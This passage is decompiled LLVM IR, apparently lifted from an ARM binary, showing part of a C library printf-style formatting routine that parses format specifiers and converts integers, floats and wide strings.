  %v2_14b94 = call i32 @_ppfs_init(i32* nonnull %stack_var_-352)
  store i32 %v2_14b94, i32* %r0.global-to-local, align 4
  %v1_14b9c = icmp slt i32 %v2_14b94, 0
  br i1 %v1_14b9c, label %dec_label_pc_14bac, label %dec_label_pc_14be0

dec_label_pc_14bac:                               ; preds = %entry
  %v3_14bac = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_14bac, i32* @r4, align 4
  %v1_14bb0 = inttoptr i32 %v3_14bac to i8*
  store i32 %v3_14bac, i32* %r0.global-to-local, align 4
  %v3_14bb4 = call i32 @strlen(i8* %v1_14bb0)
  store i32 %v3_14bb4, i32* %r0.global-to-local, align 4
  %v2_14bb8 = icmp eq i32 %v3_14bb4, 0
  br i1 %v2_14bb8, label %bb, label %dec_label_pc_14bc8

bb:                                               ; preds = %dec_label_pc_14bac
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15238

dec_label_pc_14bc8:                               ; preds = %dec_label_pc_14bac
  %v0_14bc8 = load i32, i32* @r4, align 4
  store i32 %v0_14bc8, i32* %r0.global-to-local, align 4
  %v0_14bcc = load i32, i32* @fp, align 4
  store i32 %v0_14bcc, i32* %r2.global-to-local, align 4
  %v3_14bd0 = inttoptr i32 %v0_14bcc to i16*
  %v4_14bd0 = call i32 @__stdio_fwrite(i32 %v0_14bc8, i32 %v3_14bb4, i16* %v3_14bd0)
  store i32 %v4_14bd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15238

dec_label_pc_14be0:                               ; preds = %entry
  %v0_14be0 = load i32, i32* @r5, align 4
  store i32 %v2_14b80, i32* %r0.global-to-local, align 4
  %v2_14be8 = call i32 @_ppfs_prepargs(i32 %v2_14b80, i32 %v0_14be0)
  store i32 %v2_14be8, i32* %r0.global-to-local, align 4
  %v0_14c30 = load i32, i32* @r4, align 4
  store i32 %v0_14c30, i32* %r2.global-to-local, align 4
  %v1_14cb4 = bitcast i32* %stack_var_-352 to i8*
  %v4_14cc4 = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_14cd0 = ptrtoint i32* %stack_var_-272 to i32
  %v2_14ce8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_14d04 = icmp eq i32 %tmp104, 0
  %v2_15048 = ptrtoint i32* %stack_var_-200 to i32
  %v2_15088 = ptrtoint i32* %stack_var_-348 to i32
  %v2_1508c = ptrtoint i32* %stack_var_-72 to i32
  %v2_14f38 = ptrtoint i32* %stack_var_-44 to i32
  %v2_14f44 = ptrtoint i32* %stack_var_-52 to i32
  %v7_14da0 = zext i8 %tmp102 to i32
  %v2_14dd8 = ptrtoint i32* %stack_var_-73 to i32
  %v1_14de0 = bitcast i32* %stack_var_-73 to i8*
  %v2_14de8 = icmp ugt i32 %tmp104, 4
  %v7_14de8 = icmp eq i32 %tmp104, 5
  %v7_14ccc = ptrtoint i32* %stack_var_-280 to i32
  %v5_14cfc195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_14f0c = icmp ugt i32 %tmp104, 16
  %v7_14f0c = icmp eq i32 %tmp104, 17
  %v2_14f10 = xor i1 %v7_14f0c, true
  %v3_14f10 = and i1 %v2_14f0c, %v2_14f10
  %v2_14f94 = icmp ugt i32 %tmp104, 18
  %v7_14f94 = icmp eq i32 %tmp104, 19
  %v2_14f98 = xor i1 %v7_14f94, true
  %v3_14f98 = and i1 %v2_14f94, %v2_14f98
  %v7_15030 = icmp eq i32 %tmp104, 20
  %v1_14d48 = add i32 %tmp104, add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -38941)
  %v2_14d48 = inttoptr i32 %v1_14d48 to i8*
  %v2_14d74 = xor i1 %v7_14de8, true
  %v3_14d74 = and i1 %v2_14de8, %v2_14d74
  %v7_14da8 = icmp eq i32 %tmp104, 1
  %v2_14df0 = xor i1 %v2_14de8, true
  %v3_14df0 = or i1 %v7_14de8, %v2_14df0
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_14e58 = icmp eq i32 %tmp104, 3
  %v11_14e64 = icmp eq i32 %tmp104, 4
  %v9_14cd4 = mul nuw nsw i32 %v4_14cc4, 8
  %v10_14cd4 = add i32 %v7_14ccc, %v9_14cd4
  br label %dec_label_pc_14c34.outer

dec_label_pc_14c34.outer:                         ; preds = %dec_label_pc_1521c, %dec_label_pc_14be0
  %v0_14c3445 = phi i32 [ %v3_1521c, %dec_label_pc_1521c ], [ %v0_14c30, %dec_label_pc_14be0 ]
  %v0_14d68 = phi i32 [ %stack_var_-336.4, %dec_label_pc_1521c ], [ %tmp103, %dec_label_pc_14be0 ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_1521c ], [ 0, %dec_label_pc_14be0 ]
  br label %dec_label_pc_14c34.outer36

dec_label_pc_14c34.outer36:                       ; preds = %dec_label_pc_14c34.outer, %dec_label_pc_15228
  %v0_14c3444 = phi i32 [ %v0_14c3445, %dec_label_pc_14c34.outer ], [ %v1_15228, %dec_label_pc_15228 ]
  %v5_14c60 = phi i32 [ %v0_14c3445, %dec_label_pc_14c34.outer ], [ %v1_14c90, %dec_label_pc_15228 ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_14c34.outer ], [ %v1_15108, %dec_label_pc_15228 ]
  %v1_14c34188 = inttoptr i32 %v0_14c3444 to i8*
  %v2_14c34189 = load i8, i8* %v1_14c34188, align 1
  %v2_14c38191 = icmp eq i8 %v2_14c34189, 0
  br i1 %v2_14c38191, label %dec_label_pc_14c50, label %bb138

bb138:                                            ; preds = %dec_label_pc_14c34.outer36, %.thread6
  %v2_14c34193 = phi i8 [ %v2_14c34, %.thread6 ], [ %v2_14c34189, %dec_label_pc_14c34.outer36 ]
  %v1_14c48192 = phi i32 [ %v2_14c48, %.thread6 ], [ %v0_14c3444, %dec_label_pc_14c34.outer36 ]
  %v8_14c3c = icmp eq i8 %v2_14c34193, 37
  br i1 %v8_14c3c, label %dec_label_pc_14c50, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_14c48 = add i32 %v1_14c48192, 1
  store i32 %v2_14c48, i32* @r4, align 4
  %v1_14c34 = inttoptr i32 %v2_14c48 to i8*
  %v2_14c34 = load i8, i8* %v1_14c34, align 1
  %v2_14c38 = icmp eq i8 %v2_14c34, 0
  br i1 %v2_14c38, label %dec_label_pc_14c50, label %bb138

dec_label_pc_14c50:                               ; preds = %bb138, %.thread6, %dec_label_pc_14c34.outer36
  %v1_14c48.lcssa = phi i32 [ %v0_14c3444, %dec_label_pc_14c34.outer36 ], [ %v2_14c48, %.thread6 ], [ %v1_14c48192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_14c50 = sub i32 %v1_14c48.lcssa, %v5_14c60
  %v9_14c50 = icmp eq i32 %v1_14c48.lcssa, %v5_14c60
  br i1 %v9_14c50, label %dec_label_pc_14c84, label %dec_label_pc_14c58

dec_label_pc_14c58:                               ; preds = %dec_label_pc_14c50
  store i32 %v2_14c50, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_14c50, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_14c58
  store i32 %v5_14c60, i32* %r0.global-to-local, align 4
  %v5_14c68 = load i32, i32* @fp, align 4
  store i32 %v5_14c68, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_14c58, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_14c58 ]
  store i32 85104, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_1bb6c.1374 to i32))
  %v0_14c70 = load i32, i32* %r0.global-to-local, align 4
  %v1_14c70 = load i32, i32* @r5, align 4
  %v9_14c70 = icmp eq i32 %v0_14c70, %v1_14c70
  br i1 %v9_14c70, label %dec_label_pc_14c78, label %dec_label_pc_15230

dec_label_pc_14c78:                               ; preds = %bb142
  %v2_14c7c = add i32 %v0_14c70, %stack_var_-356.1.ph37
  %v0_14c84.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14c84

dec_label_pc_14c84:                               ; preds = %dec_label_pc_14c50, %dec_label_pc_14c78
  %v0_14c98 = phi i32 [ %v5_14c60, %dec_label_pc_14c50 ], [ %v0_14c84.pre, %dec_label_pc_14c78 ]
  %v1_15108 = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_14c50 ], [ %v2_14c7c, %dec_label_pc_14c78 ]
  %v1_14c84 = inttoptr i32 %v0_14c98 to i8*
  %v2_14c84 = load i8, i8* %v1_14c84, align 1
  %v2_14c88 = icmp eq i8 %v2_14c84, 0
  br i1 %v2_14c88, label %dec_label_pc_15238, label %dec_label_pc_14c90

dec_label_pc_14c90:                               ; preds = %dec_label_pc_14c84
  %v1_14c90 = add i32 %v0_14c98, 1
  %v2_14c90 = inttoptr i32 %v1_14c90 to i8*
  %v3_14c90 = load i8, i8* %v2_14c90, align 1
  %v7_14c94 = icmp eq i8 %v3_14c90, 37
  store i32 %v1_14c90, i32* %r2.global-to-local, align 4
  br i1 %v7_14c94, label %dec_label_pc_15228, label %dec_label_pc_14ca0

dec_label_pc_14ca0:                               ; preds = %dec_label_pc_14c90
  store i32 %v2_14b80, i32* @r4, align 4
  store i32 %v2_14b80, i32* %r0.global-to-local, align 4
  store i32 %v1_14c90, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_14cb4 = call i32 @_ppfs_parsespec(i8* %v1_14cb4)
  store i32 %v2_14b80, i32* @r0, align 4
  %v0_14cbc = call i32 @_ppfs_setargs()
  store i32 %v0_14cbc, i32* %r0.global-to-local, align 4
  store i32 %v4_14cc4, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_14ca0
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_14ca0, %bb145
  %storemerge = phi i32 [ %v10_14cd4, %bb145 ], [ %v7_14cd0, %dec_label_pc_14ca0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_14cfc195, label %dec_label_pc_14ce0, label %dec_label_pc_14d00

dec_label_pc_14ce0:                               ; preds = %bb146, %dec_label_pc_14ce0
  %v5_14cec197 = phi i32 [ %v5_14cec, %dec_label_pc_14ce0 ], [ %v2_14ce8, %bb146 ]
  %v0_14ce0196 = phi i32 [ %v1_14ce4, %dec_label_pc_14ce0 ], [ %storemerge, %bb146 ]
  %v2_14ce0 = add i32 %v5_14cec197, -32
  %v3_14ce0 = inttoptr i32 %v2_14ce0 to i32*
  store i32 %v0_14ce0196, i32* %v3_14ce0, align 4
  %v0_14ce4 = load i32, i32* %r0.global-to-local, align 4
  %v1_14ce4 = add i32 %v0_14ce4, 8
  store i32 %v1_14ce4, i32* %r0.global-to-local, align 4
  %v1_14cec.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_14cec = mul i32 %v1_14cec.pre, 4
  %v5_14cec = add i32 %v4_14cec, %v2_14ce8
  %v1_14cf8 = add i32 %v1_14cec.pre, 1
  store i32 %v1_14cf8, i32* %r2.global-to-local, align 4
  %v5_14cfc = icmp slt i32 %v1_14cec.pre, %tmp105
  br i1 %v5_14cfc, label %dec_label_pc_14ce0, label %dec_label_pc_14d00

dec_label_pc_14d00:                               ; preds = %dec_label_pc_14ce0, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_14d04, label %dec_label_pc_14d0c, label %dec_label_pc_14d30

dec_label_pc_14d0c:                               ; preds = %dec_label_pc_14d00
  %v3_14d0c = load i32, i32* %stack_var_-72, align 4
  %v1_14d18 = inttoptr i32 %v3_14d0c to i32*
  %v2_14d18 = load i32, i32* %v1_14d18, align 4
  store i32 %v2_14d18, i32* %r0.global-to-local, align 4
  %v1_14d1c = and i32 %v0_14d68, 3840
  store i32 %v1_15108, i32* %r2.global-to-local, align 4
  %v3_14d24 = ashr i32 %v1_15108, 31
  %v4_14d28 = inttoptr i32 %v2_14d18 to i16*
  %v5_14d28 = call i32 @_store_inttype(i16* %v4_14d28, i32 %v1_14d1c, i32 %v1_15108, i32 %v3_14d24)
  store i32 %v5_14d28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1521c

dec_label_pc_14d30:                               ; preds = %dec_label_pc_14d00
  br i1 %tmp207, label %dec_label_pc_14ecc, label %dec_label_pc_14d38

dec_label_pc_14d38:                               ; preds = %dec_label_pc_14d30
  %v3_14d48 = load i8, i8* %v2_14d48, align 1
  %v4_14d48 = zext i8 %v3_14d48 to i32
  %v7_14d4c = icmp eq i8 %v3_14d48, 10
  br i1 %v7_14d4c, label %dec_label_pc_14d58, label %bb147

bb147:                                            ; preds = %dec_label_pc_14d38
  br label %bb151

dec_label_pc_14d58:                               ; preds = %dec_label_pc_14d38
  %v1_14d68 = and i32 %v0_14d68, 64
  %v2_14d68 = icmp eq i32 %v1_14d68, 0
  br i1 %v2_14d68, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_14d58
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_14d58, %bb150
  br i1 %v3_14d74, label %.thread, label %dec_label_pc_14d7c

.thread:                                          ; preds = %bb151
  %v5_14d74 = sub nsw i32 0, %v4_14d48
  br label %dec_label_pc_14d94

dec_label_pc_14d7c:                               ; preds = %bb151
  br i1 %v7_14e58, label %bb152, label %dec_label_pc_14d88

bb152:                                            ; preds = %dec_label_pc_14d7c
  br label %dec_label_pc_14d94

dec_label_pc_14d88:                               ; preds = %dec_label_pc_14d7c
  br i1 %v7_14da8, label %dec_label_pc_14d98, label %dec_label_pc_14d94

dec_label_pc_14d94:                               ; preds = %.thread, %bb152, %dec_label_pc_14d88
  %v0_14dc081 = phi i32 [ %v5_14d74, %.thread ], [ %v4_14d48, %bb152 ], [ %v4_14d48, %dec_label_pc_14d88 ]
  br label %dec_label_pc_14d98

dec_label_pc_14d98:                               ; preds = %dec_label_pc_14d88, %dec_label_pc_14d94
  %v0_14dc080 = phi i32 [ %v0_14dc081, %dec_label_pc_14d94 ], [ %v4_14d48, %dec_label_pc_14d88 ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_14d94 ], [ 6, %dec_label_pc_14d88 ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_14d98 = load i32, i32* %stack_var_-348, align 4
  %v1_14d9c = icmp slt i32 %v3_14d98, 0
  %v7_14da0. = select i1 %v1_14d9c, i32 %v7_14da0, i32 32
  store i32 %v7_14da0., i32* @sb, align 4
  br i1 %v7_14da8, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_14d98
  store i32 %v2_14ce8, i32* %r2.global-to-local, align 4
  %v2_14db0 = load i32, i32* @ip, align 4
  %v5_14db0 = mul i32 %v2_14db0, 4
  %v6_14db0 = add i32 %v5_14db0, %v2_14ce8
  %v2_14db4 = add i32 %v6_14db0, -276
  %v3_14db4 = inttoptr i32 %v2_14db4 to i32*
  %v4_14db4 = load i32, i32* %v3_14db4, align 4
  %v2_14dbc = and i32 %v4_14db4, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_14d98, %.thread15
  %storemerge93 = phi i32 [ %v2_14dbc, %.thread15 ], [ 1024, %dec_label_pc_14d98 ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_14dc080, i32* @r2, align 4
  %v3_14dc4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_14dc4, i32* @r1, align 4
  %v0_14dc8 = call i32 @_load_inttype()
  store i32 %v0_14dc8, i32* @r2, align 4
  %v0_14dd4 = load i32, i32* @r1, align 4
  store i32 %v0_14dd4, i32* @r3, align 4
  store i32 %v2_14dd8, i32* %r0.global-to-local, align 4
  %v2_14de0 = call i32 @_uintmaxtostr(i8* %v1_14de0)
  store i32 %v2_14de0, i32* %r0.global-to-local, align 4
  store i32 %v2_14de0, i32* @r4, align 4
  br i1 %v3_14df0, label %bb160, label %dec_label_pc_14df4

dec_label_pc_14df4:                               ; preds = %bb157
  %v3_14de0 = inttoptr i32 %v2_14de0 to i8*
  %v3_14df4 = load i8, i8* %v3_14de0, align 1
  %v7_14df8 = icmp eq i8 %v3_14df4, 45
  %v2_14e00 = or i32 %v0_14d68, 2
  %v2_14e00.stack_var_-336.0 = select i1 %v7_14df8, i32 %v2_14e00, i32 %v0_14d68
  br i1 %v7_14df8, label %.thread17, label %dec_label_pc_14e14

.thread17:                                        ; preds = %dec_label_pc_14df4
  %v3_14e04 = add i32 %v2_14de0, 1
  store i32 %v3_14e04, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_14e14:                               ; preds = %dec_label_pc_14df4
  %v1_14e14 = and i32 %v2_14e00.stack_var_-336.0, 2
  %v2_14e14 = icmp eq i32 %v1_14e14, 0
  br i1 %v2_14e14, label %dec_label_pc_14e20, label %bb158

bb158:                                            ; preds = %dec_label_pc_14e14
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_14e20:                               ; preds = %dec_label_pc_14e14
  %v1_14e20 = urem i32 %v2_14e00.stack_var_-336.0, 2
  %v2_14e20 = icmp eq i32 %v1_14e20, 0
  br i1 %v2_14e20, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_14e20
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_14e20, %bb159
  %v0_14e7c = phi i32 [ %v2_14de0, %bb157 ], [ %v3_14e04, %.thread17 ], [ %v2_14de0, %dec_label_pc_14e20 ], [ %v2_14de0, %bb159 ], [ %v2_14de0, %bb158 ]
  %v0_14e38 = phi i32 [ %v0_14d68, %bb157 ], [ %v2_14e00, %.thread17 ], [ %v0_14d68, %dec_label_pc_14e20 ], [ %v0_14d68, %bb159 ], [ %v0_14d68, %bb158 ]
  %v3_14e28 = load i32, i32* %stack_var_-348, align 4
  %v1_14e30 = icmp slt i32 %v3_14e28, 0
  br i1 %v1_14e30, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_14e28, %bb160 ]
  %v0_14e60 = phi i32 [ 1, %bb161 ], [ %v3_14e28, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_14e38 = and i32 %v0_14e38, 16
  %v2_14e38 = icmp eq i32 %v1_14e38, 0
  %v2_14e44 = sub i32 %v2_14dd8, %v0_14e7c
  store i32 %v2_14e44, i32* @r5, align 4
  br i1 %v2_14e38, label %bb169, label %dec_label_pc_14e4c

dec_label_pc_14e4c:                               ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_14e4c
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_14e4c, %bb163
  br i1 %v7_14e58, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_14e60, %v2_14e44
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_14e64, label %dec_label_pc_14e6c, label %bb169

dec_label_pc_14e6c:                               ; preds = %bb167
  %v1_14e6c = inttoptr i32 %v0_14e7c to i8*
  %v2_14e6c = load i8, i8* %v1_14e6c, align 1
  %v7_14e70 = icmp eq i8 %v2_14e6c, 48
  br i1 %v7_14e70, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_14e6c
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_14e6c
  %v2_14e78 = add i32 %v2_14e44, 1
  store i32 %v2_14e78, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_14ebc = phi i32 [ %v0_14e60, %bb167 ], [ %v0_14e60, %bb162 ], [ 1, %bb168 ], [ %v2_14e78, %.thread24 ], [ %v0_14e60, %bb166 ]
  %v1_14e7c = inttoptr i32 %v0_14e7c to i8*
  %v2_14e7c = load i8, i8* %v1_14e7c, align 1
  %v7_14e80 = icmp eq i8 %v2_14e7c, 48
  br i1 %v7_14e80, label %dec_label_pc_14e88, label %dec_label_pc_14eb8

dec_label_pc_14e88:                               ; preds = %bb169
  %v0_14e8c = load i32, i32* @r6, align 4
  %v7_14e90 = icmp slt i32 %v0_14e8c, 6
  br i1 %v7_14e90, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_14e88
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_14e88, %bb170
  br i1 %v7_14da8, label %.thread27, label %dec_label_pc_14eac

.thread27:                                        ; preds = %bb171
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -38968), i32* @r4, align 4
  br label %dec_label_pc_14ec4

dec_label_pc_14eac:                               ; preds = %bb171
  %v2_14eac = icmp eq i32 %v5_14ebc, 0
  br i1 %v2_14eac, label %bb172, label %dec_label_pc_14eb8

bb172:                                            ; preds = %dec_label_pc_14eac
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_14ec4

dec_label_pc_14eb8:                               ; preds = %dec_label_pc_14eac, %bb169
  %v2_14eb8 = sub i32 %v5_14ebc, %v2_14e44
  %tmp211 = icmp ugt i32 %v5_14ebc, %v2_14e44
  br i1 %tmp211, label %.thread85, label %dec_label_pc_14ec4

.thread85:                                        ; preds = %dec_label_pc_14eb8
  store i32 %v2_14eb8, i32* @r8, align 4
  br label %dec_label_pc_150d8thread-pre-split

dec_label_pc_14ec4:                               ; preds = %dec_label_pc_14eb8, %.thread27, %bb172
  %v1_150dc.pre205 = phi i32 [ %v2_14e44, %dec_label_pc_14eb8 ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_150d8thread-pre-split

dec_label_pc_14ecc:                               ; preds = %dec_label_pc_14d30
  br i1 %tmp208, label %dec_label_pc_14f0c, label %dec_label_pc_14ed4

dec_label_pc_14ed4:                               ; preds = %dec_label_pc_14ecc
  %v3_14ee4 = load i32, i32* %stack_var_-72, align 4
  %v0_14ee8 = load i32, i32* @fp, align 4
  store i32 %v0_14ee8, i32* %r0.global-to-local, align 4
  %v1_14eec = inttoptr i32 %v3_14ee4 to i32*
  %v2_14eec = load i32, i32* %v1_14eec, align 4
  store i32 %v2_14eec, i32* %r2.global-to-local, align 4
  %v3_14eec = add i32 %v3_14ee4, 4
  %v4_14eec = inttoptr i32 %v3_14eec to i32*
  %v5_14eec = load i32, i32* %v4_14eec, align 4
  %v8_14ef0 = call i32 @_fpmaxtostr(i32 %v0_14ee8, double bitcast (i64 sext (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -120112) to i64) to double), i32 %v2_14eec, i32 %v5_14eec, i32 %v2_15088, i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -120112))
  store i32 %v8_14ef0, i32* %r0.global-to-local, align 4
  %v1_14ef4 = icmp slt i32 %v8_14ef0, 0
  br i1 %v1_14ef4, label %dec_label_pc_15230, label %dec_label_pc_14efc

dec_label_pc_14efc:                               ; preds = %dec_label_pc_14ed4
  %v2_14f00 = add i32 %v8_14ef0, %v1_15108
  store i32 %v2_14f00, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1521c

dec_label_pc_14f0c:                               ; preds = %dec_label_pc_14ecc
  br i1 %v3_14f10, label %dec_label_pc_14f94, label %dec_label_pc_14f14

dec_label_pc_14f14:                               ; preds = %dec_label_pc_14f0c
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_14f1c = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_14f1c, i32* %r0.global-to-local, align 4
  br i1 %v7_14f0c, label %dec_label_pc_14f24, label %dec_label_pc_14f5c

dec_label_pc_14f24:                               ; preds = %dec_label_pc_14f14
  %v1_14f24 = inttoptr i32 %v3_14f1c to i32*
  %v2_14f24 = load i32, i32* %v1_14f24, align 4
  %v9_14f28 = icmp eq i32 %v2_14f24, 0
  store i32 %v2_14f24, i32* %stack_var_-44, align 4
  br i1 %v9_14f28, label %dec_label_pc_14fd4, label %dec_label_pc_14f34

dec_label_pc_14f34:                               ; preds = %dec_label_pc_14f24
  %v3_14f34 = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_14f38, i32* @r0, align 4
  %v4_14f3c = ashr i32 %v3_14f34, 31
  %v5_14f3c = or i32 %v4_14f3c, %v3_14f34
  store i32 %v5_14f3c, i32* %r2.global-to-local, align 4
  store i32 %v2_14f38, i32* @r1, align 4
  %v6_14f48 = call i32 @__GI_wcsrtombs(i32 %v2_14f38, i32 %v2_14f38, i32 %v5_14f3c, i32 %v2_14f44, i32 0, i32 %v2_14f24)
  store i32 %v6_14f48, i32* %r0.global-to-local, align 4
  %v3_14f4c = icmp eq i32 %v6_14f48, -1
  store i32 %v6_14f48, i32* @r5, align 4
  br i1 %v3_14f4c, label %dec_label_pc_15230, label %dec_label_pc_150c8

dec_label_pc_14f5c:                               ; preds = %dec_label_pc_14f14
  store i32 %v2_15048, i32* %r7.global-to-local, align 4
  %v1_14f60 = inttoptr i32 %v3_14f1c to i32*
  %v2_14f60 = load i32, i32* %v1_14f60, align 4
  store i32 %v2_14f44, i32* %r2.global-to-local, align 4
  store i32 %v2_15048, i32* %r0.global-to-local, align 4
  %v5_14f6c = call i32 @__GI_wcrtomb(i32 %v2_15048, i32 %v2_14f60, i32 %v2_14f44, i32 %tmp105, i32 0)
  store i32 %v5_14f6c, i32* %r0.global-to-local, align 4
  %v7_14f70 = icmp eq i32 %v5_14f6c, -1
  store i32 %v5_14f6c, i32* @r5, align 4
  br i1 %v7_14f70, label %dec_label_pc_15230, label %dec_label_pc_14f7c

dec_label_pc_14f7c:                               ; preds = %dec_label_pc_14f5c
  %v0_14f7c = load i32, i32* @sl, align 4
  store i32 %v0_14f7c, i32* @r8, align 4
  store i32 %v2_15048, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_14f8c = trunc i32 %v0_14f7c to i8
  %v2_14f8c = load i32, i32* %r7.global-to-local, align 4
  %v4_14f8c = add i32 %v2_14f8c, %v5_14f6c
  %v5_14f8c = inttoptr i32 %v4_14f8c to i8*
  store i8 %v1_14f8c, i8* %v5_14f8c, align 1
  %v0_150dc.pre.pre = load i32, i32* @r8, align 4
  %v1_150dc.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_150d8thread-pre-split

dec_label_pc_14f94:                               ; preds = %dec_label_pc_14f0c
  br i1 %v3_14f98, label %dec_label_pc_15030, label %dec_label_pc_14f9c

dec_label_pc_14f9c:                               ; preds = %dec_label_pc_14f94
  %v3_14f9c = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_14f9c, i32* %r0.global-to-local, align 4
  %v1_14fa4 = inttoptr i32 %v3_14f9c to i32*
  %v2_14fa4 = load i32, i32* %v1_14fa4, align 4
  br i1 %v7_14f94, label %dec_label_pc_14fa4, label %dec_label_pc_15008

dec_label_pc_14fa4:                               ; preds = %dec_label_pc_14f9c
  store i32 %v2_14fa4, i32* @r4, align 4
  %v2_14fa8 = icmp eq i32 %v2_14fa4, 0
  br i1 %v2_14fa8, label %dec_label_pc_14fd4, label %dec_label_pc_14fb0

dec_label_pc_14fb0:                               ; preds = %dec_label_pc_14fa4, %dec_label_pc_15038
  %v0_14fb4 = phi i32 [ %v2_14fa4, %dec_label_pc_14fa4 ], [ %v4_15050, %dec_label_pc_15038 ]
  %v3_14fb0 = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_14fb4, i32* %r0.global-to-local, align 4
  %v4_14fb8 = ashr i32 %v3_14fb0, 31
  %v5_14fb8 = or i32 %v4_14fb8, %v3_14fb0
  %v2_14fbc = inttoptr i32 %v0_14fb4 to i8*
  %v3_14fbc = call i32 @strnlen(i8* %v2_14fbc, i32 %v5_14fb8)
  store i32 %v3_14fbc, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_14fbc, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_150d8

dec_label_pc_14fd4:                               ; preds = %dec_label_pc_14fa4, %dec_label_pc_14f24
  %v3_14fd4 = load i32, i32* %stack_var_-348, align 4
  %v1_14fd8 = icmp slt i32 %v3_14fd4, 0
  br i1 %v1_14fd8, label %dec_label_pc_14ff0, label %dec_label_pc_14fe0

dec_label_pc_14fe0:                               ; preds = %dec_label_pc_14fd4
  %tmp212 = icmp ult i32 %v3_14fd4, 6
  br i1 %tmp212, label %dec_label_pc_14ff8, label %dec_label_pc_14ff0

dec_label_pc_14ff0:                               ; preds = %dec_label_pc_14fe0, %dec_label_pc_14fd4
  br label %dec_label_pc_14ff8

dec_label_pc_14ff8:                               ; preds = %dec_label_pc_14fe0, %dec_label_pc_14ff0
  %storemerge97 = phi i32 [ 6, %dec_label_pc_14ff0 ], [ 0, %dec_label_pc_14fe0 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
